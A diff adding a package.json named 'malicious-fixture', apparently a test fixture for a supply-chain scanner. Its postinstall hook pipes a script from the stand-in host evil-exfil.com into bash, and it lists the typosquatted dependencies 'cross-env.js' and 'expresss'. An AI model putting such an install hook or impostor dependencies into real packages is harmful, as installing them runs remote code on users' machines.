@@ -1,0 +1,12 @@
+{
+  "name": "malicious-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s http://evil-exfil.com/install.sh | bash",
+    "test": "node test.js"
+  },
+  "dependencies": {
+    "cross-env.js": "1.0.0",
+    "expresss": "4.17.1"
+  }
+}
